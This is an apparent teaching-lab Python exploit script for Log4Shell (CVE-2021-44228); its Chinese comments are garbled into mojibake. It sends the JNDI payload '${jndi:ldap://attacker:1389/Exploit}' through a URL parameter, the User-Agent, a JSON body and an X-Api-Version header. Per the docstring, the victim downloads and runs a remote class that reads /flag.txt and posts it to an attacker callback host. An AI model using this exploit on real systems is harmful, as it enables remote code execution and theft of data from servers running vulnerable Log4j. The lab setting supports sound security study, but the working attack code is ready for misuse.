#!/usr/bin/env python3
"""
Log4Shell (CVE-2021-44228) æ”»æ“Šè…³æœ¬
====================================

æ­¤è…³æœ¬å‘æœ‰æ¼æ´çš„ Log4Shell å¾Œç«¯ç™¼é€æ”»æ“Š payloadï¼Œ
è§¸ç™¼ JNDI lookup æ¼æ´ï¼Œæœ€çµ‚å–å¾—ç›®æ¨™ä¼ºæœå™¨ä¸Šçš„ flagã€‚

ä½¿ç”¨æ–¹å¼ï¼š
    1. å…ˆå•Ÿå‹• docker-compose ç’°å¢ƒ
    2. å»ºç«‹ Python è™›æ“¬ç’°å¢ƒä¸¦å®‰è£ä¾è³´
    3. åŸ·è¡Œæ­¤è…³æœ¬

æ”»æ“Šæµç¨‹ï¼š
    1. æœ¬è…³æœ¬ç™¼é€å«æœ‰ ${jndi:ldap://attacker:1389/Exploit} çš„è«‹æ±‚
    2. Log4j è§£æ JNDI lookupï¼Œé€£æ¥ attacker å®¹å™¨çš„ LDAP Server
    3. LDAP Server å›å‚³ Referenceï¼ŒæŒ‡å‘ HTTP Server çš„ Exploit.class
    4. å—å®³è€… JVM ä¸‹è¼‰ä¸¦åŸ·è¡Œ Exploit.class
    5. Exploit.class è®€å– /flag.txtï¼ŒPOST åˆ° attacker:9999/callback
    6. é€²å…¥ attacker å®¹å™¨æŸ¥çœ‹ /var/log/attacker.log é©—è­‰ flag
"""

import argparse
import requests
import time
import sys
from urllib.parse import quote

# é è¨­è¨­å®š
DEFAULT_TARGET = "http://localhost:8083"
DEFAULT_LDAP_HOST = "attacker"
DEFAULT_LDAP_PORT = 1389

# æ”»æ“Š payload æ¨¡æ¿
PAYLOAD_TEMPLATE = "${jndi:ldap://%s:%d/Exploit}"


def print_banner():
    """é¡¯ç¤º banner"""
    banner = """
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘           Log4Shell (CVE-2021-44228) Exploit             â•‘
    â•‘                                                          â•‘
    â•‘  âš ï¸  åƒ…ä¾›æ•™å­¸æ¼”ç¤ºä½¿ç”¨ï¼Œè«‹å‹¿ç”¨æ–¼éæ³•ç”¨é€”ï¼                â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """
    print(banner)


def create_payload(ldap_host: str, ldap_port: int) -> str:
    """å»ºç«‹æ”»æ“Š payload"""
    return PAYLOAD_TEMPLATE % (ldap_host, ldap_port)


def attack_via_parameter(target: str, payload: str) -> bool:
    """é€é URL åƒæ•¸ç™¼é€æ”»æ“Š"""
    print(f"\n[*] æ”»æ“Šæ–¹å¼ 1: URL åƒæ•¸æ³¨å…¥")
    print(f"    ç›®æ¨™: {target}/api/log4j/search")
    print(f"    Payload: keyword={payload}")
    
    try:
        url = f"{target}/api/log4j/search"
        params = {"keyword": payload}
        response = requests.get(url, params=params, timeout=10)
        print(f"    å›æ‡‰ç‹€æ…‹ç¢¼: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"    éŒ¯èª¤: {e}")
        return False


def attack_via_header(target: str, payload: str) -> bool:
    """é€é HTTP Header ç™¼é€æ”»æ“Š"""
    print(f"\n[*] æ”»æ“Šæ–¹å¼ 2: HTTP Header æ³¨å…¥")
    print(f"    ç›®æ¨™: {target}/api/log4j/search")
    print(f"    Header: User-Agent: {payload}")
    
    try:
        url = f"{target}/api/log4j/search"
        headers = {"User-Agent": payload}
        params = {"keyword": "test"}
        response = requests.get(url, params=params, headers=headers, timeout=10)
        print(f"    å›æ‡‰ç‹€æ…‹ç¢¼: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"    éŒ¯èª¤: {e}")
        return False


def attack_via_json_body(target: str, payload: str) -> bool:
    """é€é JSON Body ç™¼é€æ”»æ“Š"""
    print(f"\n[*] æ”»æ“Šæ–¹å¼ 3: JSON Body æ³¨å…¥")
    print(f"    ç›®æ¨™: {target}/api/log4j/login")
    print(f"    Body: {{\"username\": \"{payload}\"}}")
    
    try:
        url = f"{target}/api/log4j/login"
        data = {"username": payload, "password": "test"}
        response = requests.post(url, json=data, timeout=10)
        print(f"    å›æ‡‰ç‹€æ…‹ç¢¼: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"    éŒ¯èª¤: {e}")
        return False


def attack_via_x_api_version(target: str, payload: str) -> bool:
    """é€é X-Api-Version Header ç™¼é€æ”»æ“Š"""
    print(f"\n[*] æ”»æ“Šæ–¹å¼ 4: X-Api-Version Header æ³¨å…¥")
    print(f"    ç›®æ¨™: {target}/api/log4j/search")
    print(f"    Header: X-Api-Version: {payload}")
    
    try:
        url = f"{target}/api/log4j/search"
        headers = {"X-Api-Version": payload}
        params = {"keyword": "test"}
        response = requests.get(url, params=params, headers=headers, timeout=10)
        print(f"    å›æ‡‰ç‹€æ…‹ç¢¼: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"    éŒ¯èª¤: {e}")
        return False


def check_target_status(target: str) -> bool:
    """æª¢æŸ¥ç›®æ¨™æ˜¯å¦å¯é€£ç·š"""
    print(f"\n[*] æª¢æŸ¥ç›®æ¨™ç‹€æ…‹: {target}")
    
    try:
        response = requests.get(f"{target}/api/log4j/status", timeout=5)
        if response.status_code == 200:
            data = response.json()
            print(f"    æœå‹™: {data.get('service', 'unknown')}")
            print(f"    Log4j ç‰ˆæœ¬: {data.get('log4j_version', 'unknown')}")
            print(f"    æœ‰æ¼æ´: {data.get('vulnerable', 'unknown')}")
            return data.get('vulnerable', False)
        return False
    except Exception as e:
        print(f"    ç„¡æ³•é€£ç·š: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Log4Shell (CVE-2021-44228) æ”»æ“Šè…³æœ¬",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ç¯„ä¾‹ï¼š
    python exploit.py                           # ä½¿ç”¨é è¨­è¨­å®šæ”»æ“Š
    python exploit.py --target http://victim:8083  # æŒ‡å®šç›®æ¨™
    python exploit.py --method all              # ä½¿ç”¨æ‰€æœ‰æ”»æ“Šæ–¹å¼
    python exploit.py --method header           # åªä½¿ç”¨ Header æ³¨å…¥

é©—è­‰æ”»æ“Šçµæœï¼š
    docker exec -it owasp-attacker cat /var/log/attacker.log
        """
    )
    
    parser.add_argument(
        "--target", "-t",
        default=DEFAULT_TARGET,
        help=f"ç›®æ¨™ URL (é è¨­: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--ldap-host",
        default=DEFAULT_LDAP_HOST,
        help=f"LDAP Server ä¸»æ©Ÿåç¨± (é è¨­: {DEFAULT_LDAP_HOST})"
    )
    parser.add_argument(
        "--ldap-port",
        type=int,
        default=DEFAULT_LDAP_PORT,
        help=f"LDAP Server åŸ è™Ÿ (é è¨­: {DEFAULT_LDAP_PORT})"
    )
    parser.add_argument(
        "--method", "-m",
        choices=["param", "header", "body", "x-api-version", "all"],
        default="all",
        help="æ”»æ“Šæ–¹å¼ (é è¨­: all)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=1.0,
        help="æ¯æ¬¡æ”»æ“Šä¹‹é–“çš„å»¶é²ç§’æ•¸ (é è¨­: 1.0)"
    )
    
    args = parser.parse_args()
    
    print_banner()
    
    # æª¢æŸ¥ç›®æ¨™ç‹€æ…‹
    if not check_target_status(args.target):
        print("\n[!] ç›®æ¨™ç„¡æ³•é€£ç·šæˆ–éæ¼æ´ç‰ˆæœ¬")
        print("    è«‹ç¢ºèª docker-compose ç’°å¢ƒå·²å•Ÿå‹•")
        print("    åŸ·è¡Œ: docker-compose up -d")
        sys.exit(1)
    
    # å»ºç«‹ payload
    payload = create_payload(args.ldap_host, args.ldap_port)
    print(f"\n[+] æ”»æ“Š Payload: {payload}")
    
    # åŸ·è¡Œæ”»æ“Š
    success_count = 0
    
    if args.method in ["param", "all"]:
        if attack_via_parameter(args.target, payload):
            success_count += 1
        time.sleep(args.delay)
    
    if args.method in ["header", "all"]:
        if attack_via_header(args.target, payload):
            success_count += 1
        time.sleep(args.delay)
    
    if args.method in ["body", "all"]:
        if attack_via_json_body(args.target, payload):
            success_count += 1
        time.sleep(args.delay)
    
    if args.method in ["x-api-version", "all"]:
        if attack_via_x_api_version(args.target, payload):
            success_count += 1
    
    # çµæœ
    print("\n" + "=" * 60)
    print(f"[*] æ”»æ“Šå®Œæˆï¼æˆåŠŸç™¼é€ {success_count} å€‹ payload")
    print()
    print("[*] é©—è­‰æ”»æ“Šçµæœï¼š")
    print("    docker exec -it owasp-attacker cat /var/log/attacker.log")
    print()
    print("[*] è‹¥æ”»æ“ŠæˆåŠŸï¼Œæ‡‰è©²æœƒçœ‹åˆ°é¡ä¼¼ä»¥ä¸‹çš„æ—¥èªŒï¼š")
    print("    [CALLBACK] ğŸ‰ FLAG RECEIVED!")
    print("    [CALLBACK] Body: flag=FLAG{log4j_cve_2021_44228_pwned}&...")
    print("=" * 60)


if __name__ == "__main__":
    main()
